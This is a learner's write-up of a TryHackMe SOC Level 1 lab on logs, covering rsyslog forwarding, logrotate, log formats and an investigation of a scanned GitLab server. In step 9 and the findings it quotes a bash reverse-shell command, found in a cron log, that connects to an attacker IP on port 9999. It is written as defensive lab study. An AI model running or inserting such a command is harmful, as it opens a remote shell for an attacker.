# Day 39: Intro to Logs

**Path:** SOC Level 1
**Platform:** TryHackMe
**Status:** ✅ Completed

---

## 📌 Overview

This room covers logs as records of historical system activity, and why they matter for security monitoring and incident response. A log entry typically carries a timestamp, the system/application that generated it, the event type, and supporting detail like the user or IP address involved. On their own, individual entries are close to meaningless — the value comes from aggregating and cross-referencing them to answer *what* happened, *when*, *where*, *who* was responsible, and *what the outcome was*.

The room breaks log formats into three buckets: **semi-structured** (Syslog, Windows EVTX), **structured** (CSV/TSV, JSON, W3C ELF, XML), and **unstructured** (NCSA Common Log Format used by Apache, NCSA Combined Log Format used by Nginx). It also introduces log standards like CEE, the OWASP Logging Cheat Sheet, and the Syslog protocol (RFC 5424), which govern how logs should be generated, transmitted, and retained — not just their format.

For collection, the room stresses keeping system time accurate via NTP so a timeline stays trustworthy, then walks through log management (storage, organisation, backup, review) and centralisation into something like Splunk or the Elastic Stack. Retention gets split into **Hot** (3–6 months, near real-time queries), **Warm** (6 months–2 years, data-lake style), and **Cold** (2–5 years, archived/compressed, retroactive use only) storage tiers.

The scenario for the practical side: **SwiftSpend Financial**'s public-facing GitLab server is being repeatedly scanned by an adversary, and I (as sysadmin, logged in as `damianhall`) had to configure logging and dig through what was collected to work out what the attacker was doing. `damianhall` has limited sudo rights (checkable with `sudo -l`), but they're enough to complete every task — privilege escalation isn't needed anywhere in this room.

The hands-on portion covers configuring **rsyslog** to forward `sshd` messages to a dedicated log file, using **logrotate** to automate rotation/compression/hashing of that log, and finally working with both unparsed raw logs and a parsed-and-consolidated log file through an open-source **Log Viewer** tool.

---

## 🛠️ Tools Used

- Linux terminal (bash) on the THM AttackBox VM
- `rsyslog` — log forwarding/collection daemon
- `logrotate` — log rotation, compression, and (via a custom script) hashing
- `gedit` / `nano` — text editors for config files
- `ssh` — used locally to generate test sshd log entries
- Log Viewer (web tool, port 8111) — for viewing raw and parsed/consolidated logs
- Standard Unix tools referenced for log parsing: `cat`, `grep`, `sed`, `sort`, `uniq`, `awk`, `sha256sum`

---

## 🪜 Steps Followed

**1. Found Perry's note on the Desktop**
Opened `note.txt` on the Desktop, which laid out the scenario context: this server is SwiftSpend's public-facing GitLab box, log forwarding to SIEM-02 isn't configured yet (it's commented out in the rsyslog config), and there's suspected persistent scanning against it. The note was signed by a colleague named Perry.

![Desktop with note.txt icon](screenshots/01-desktop-notetxt-icon.png)
![note.txt signed by Perry](screenshots/02-notetxt-signed-perry.png)

**2. Identified the suggested log file for initial investigation**
The note pointed specifically to `/var/log/gitlab/nginx/access.log` as the place to start looking for suspicious web browser activity.

![access.log path highlighted in note.txt](screenshots/03-notetxt-access-log-path-highlighted.png)

**3. Confirmed rsyslog was running**
Before configuring anything, checked the service status with `sudo systemctl status rsyslog` — confirmed active and running.

![rsyslog service active](screenshots/04-rsyslog-service-status-active.png)

**4. Created the rsyslog config for sshd forwarding**
Opened `gedit /etc/rsyslog.d/98-websrv-02-sshd.conf` and added the two lines needed to route all `sshd`-tagged messages to `/var/log/websrv-02/rsyslog_sshd.log`:

```
$FileCreateMode 0644
:programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log
```

![gedit opening the sshd config](screenshots/05-gedit-98-websrv-02-sshd-conf-opening.png)
![sshd config contents](screenshots/06-98-websrv-02-sshd-conf-contents.png)

**5. Restarted rsyslog and checked for the new log file**
Ran `sudo systemctl restart rsyslog`, then `cd /var/log/websrv-02/` and `ls -lsa` — at this point `rsyslog_sshd.log` didn't exist yet since no sshd activity had occurred since the restart.

![restarting rsyslog](screenshots/07-rsyslog-restart-after-config.png)
![cd into websrv-02](screenshots/08-cd-var-log-websrv-02.png)
![ls before sshd log exists](screenshots/09-ls-lsa-before-sshd-log.png)

**6. Generated a test sshd log entry via `ssh localhost`**
Ran `ssh localhost` to trigger some genuine sshd activity, accepted the new host key, and logged in successfully. Afterward, the log file appeared with real content.

![sshd log file created](screenshots/10-ls-lsa-rsyslog-sshd-log-created.png)
![ssh localhost authenticity prompt](screenshots/11-ssh-localhost-authenticity-prompt.png)
![successful local ssh login](screenshots/12-ssh-localhost-login-banner.png)
![ls of home directory post-ssh](screenshots/13-ls-lsa-home-directory.png)
![cd back into websrv-02, listing all logs](screenshots/14-cd-websrv-02-ls-log-files.png)

**7. Found the brute-forced username in the sshd log**
Ran `cat rsyslog_sshd.log` and scrolled through — the log was full of `Invalid user` and `Failed password` entries for the same username, repeated dozens of times from `34.253.159.159`, clearly an automated brute-force attempt.

![cat rsyslog_sshd.log — start](screenshots/15-cat-rsyslog-sshd-log-start.png)
![username stansimon highlighted in failed attempts](screenshots/16-cat-rsyslog-sshd-log-stansimon-highlighted.png)

**8. Tracked down SIEM-02's IP from the cron rsyslog config**
Went looking for `/etc/rsyslog.d/99-websrv-02-cron.conf`. First mistake: tried `cd`-ing straight into the file, which predictably failed. Corrected course, `cd`'d into `/etc/rsyslog.d/` instead, then `cat`'d the file directly — found the SIEM-02 destination IP in the (commented-out) forwarding line: `@10.10.10.101:51514`.

![attempting cat, typing the command](screenshots/17-cat-rsyslog-cron-log-command-typed.png)
![mistakenly cd-ing into the conf file](screenshots/18-cd-into-cron-conf-mistake.png)
![error: not a directory](screenshots/19-cd-into-cron-conf-error-not-a-directory.png)
![cd into /etc/rsyslog.d and ls](screenshots/20-cd-etc-rsyslog-d-ls.png)
![cat of 99-websrv-02-cron.conf showing SIEM-02 IP](screenshots/21-cat-99-websrv-02-cron-conf-siem02-ip.png)

**9. Found the malicious cron command in rsyslog_cron.log**
Back in `/var/log/websrv-02/`, ran `cat rsyslog_cron.log` and found the root user's crontab repeatedly executing a reverse shell back to `34.253.159.159` on port `9999`:

```
/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"
```

This was firing on a schedule (roughly every minute), meaning persistence had already been established on the box via cron.

![cd and ls before cat cron log](screenshots/22-cd-var-log-websrv-02-ls.png)
![reverse shell command in rsyslog_cron.log](screenshots/23-cat-rsyslog-cron-log-reverse-shell-command.png)

**10. Set up logrotate for the sshd log (Day 2)**
On a new session (19 Aug, fresh AttackBox instance), followed the room's steps to create `/etc/logrotate.d/98-websrv-02_sshd.conf`, defining daily rotation, keeping 30 old copies, compressing them, and — via a `lastaction`/`endscript` block — hashing each rotated `.gz` with `sha256sum` and appending the hash to a dated `hashes_*.txt` file before restarting rsyslog.

![opening the logrotate config with gedit](screenshots/24-day2-gedit-logrotate-conf-opening.png)
![config typed in, matching room instructions side by side](screenshots/25-logrotate-conf-split-screen-instructions.png)
![gedit closed after saving](screenshots/26-gedit-closed-after-save.png)

**11. Ran logrotate manually — hit an error**
Executed `sudo logrotate -f /etc/logrotate.d/98-websrv-02_sshd.conf`. This failed with `stat of /var/log/websrv-02/rsyslog_sshd.log failed: No such file or directory` — this was a fresh VM instance where the sshd log hadn't been generated yet (no `ssh localhost` had been run on this box).

![running logrotate -f](screenshots/27-sudo-logrotate-f-command-run.png)
![error: sshd log file doesn't exist on this fresh instance](screenshots/28-logrotate-error-no-sshd-log-file.png)

**12. Switched to the Attack Box, then back — worked around a `gedit` gap**
Tried running the same commands from the standalone Attack Box (20 Aug), but `gedit` wasn't installed there (`command not found`). Went back to the original room VM and used `nano` instead. Hit a syntax error in the `.conf` file on that attempt, so instead of fighting the editor, just `cd`'d into `/etc/logrotate.d/` and used `cat` directly on `99-websrv-02_cron.conf` to read the answers straight off the file.

![gedit not found on Attack Box](screenshots/29-attackbox-gedit-command-not-found.png)
![nano error, then cat-ing the cron logrotate conf directly](screenshots/30-nano-config-error-then-cat-cron-conf.png)

**13. Read the cron logrotate settings directly**
The `cat` output for `99-websrv-02_cron.conf` showed `hourly` rotation and `rotate 24` — meaning the cron log rotates every hour and keeps 24 old compressed copies.

![cron logrotate conf: hourly, rotate 24](screenshots/31-cat-99-websrv-02-cron-conf-hourly-rotate24.png)

**14. Explored the Log Viewer tool with unparsed raw logs**
Used the room-provided URL to load four raw log files at once into the Log Viewer (port 8111): the GitLab nginx access log, both websrv-02 rsyslog files, and the GitLab Rails API JSON log.

![Log Viewer opened, split screen with room instructions](screenshots/32-log-viewer-tool-opened-split-screen.png)

**15. Found the "No date field" error on the rsyslog logs**
Checking the filter dropdown in Log Viewer, both `/var/log/websrv-02/rsyslog_cron.log` and `/var/log/websrv-02/rsyslog_sshd.log` were flagged **"No date field"** — unlike the nginx access log, which parsed its timestamp correctly. This makes sense: rsyslog's default output format doesn't include a machine-parseable date field the way the nginx/access log format does, so the tool can't sort or filter these two by time without pre-processing (which is exactly what the room's `awk`/`sed` normalisation steps are for).

![filter dropdown showing "No date field" on both rsyslog logs](screenshots/33-log-viewer-filter-no-date-field.png)

---

## 🔍 Key Findings

- Colleague's name on the Desktop note: **Perry**
- Suggested log file for initial investigation: `/var/log/gitlab/nginx/access.log`
- Username repeatedly brute-forced in `rsyslog_sshd.log`: **stansimon**
- SIEM-02 IP address (from `99-websrv-02-cron.conf`): **10.10.10.101**
- Command executed by root via cron (reverse shell): `/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"`
- Attacker's IP across both the sshd brute-force and the cron reverse shell: **34.253.159.159**
- Logrotate config for the cron log (`99-websrv-02_cron.conf`): rotation frequency **hourly**, versions retained **24**
- Log Viewer error shown for both websrv-02 rsyslog files when filtering: **No date field**
- Process of standardising parsed data into a consistent, query-able format: **Normalisation**
- Process of consolidating normalised logs to sharpen analysis around a specific IP: **Enrichment**
- Pattern worth flagging: the same source IP (`34.253.159.159`) shows up both brute-forcing SSH *and* running the cron-based reverse shell — strongly suggests this single attacker moved from credential guessing to establishing persistence once (or if) they got in, rather than these being two unrelated events.

---

## 💡 Lessons Learned

- Tooling gaps are normal across different VM/Attack Box instances — `gedit` being missing on the standalone Attack Box was a good reminder to always have a fallback editor (`nano`, `vi`) in mind rather than assuming a GUI editor will be there.
- When an editor keeps throwing syntax errors on a config I didn't necessarily need to *edit* in that moment, dropping straight to `cat` to just read the file was the faster, cleaner path — not every investigative step needs a text editor.
- The "No such file or directory" error from `logrotate -f` was a useful practical lesson: fresh VM instances don't carry over state from a previous session, so a log file has to actually be *generated* (via triggering the activity, like `ssh localhost`) before you can rotate it.
- The distinction between **Normalisation** and **Enrichment** finally clicked here: normalisation is about getting logs into a *consistent shape* (same date format, same structure) so they can be compared at all, while enrichment is about *adding context* (like tying entries to a specific IP) on top of that shape to make the data more useful for analysis.
- This room's cron log finding (a reverse shell fired on a schedule) is a nice practical companion to earlier persistence-mechanism concepts — cron jobs as a persistence method is something worth watching for again in later SIEM/EDR-focused rooms in this path.
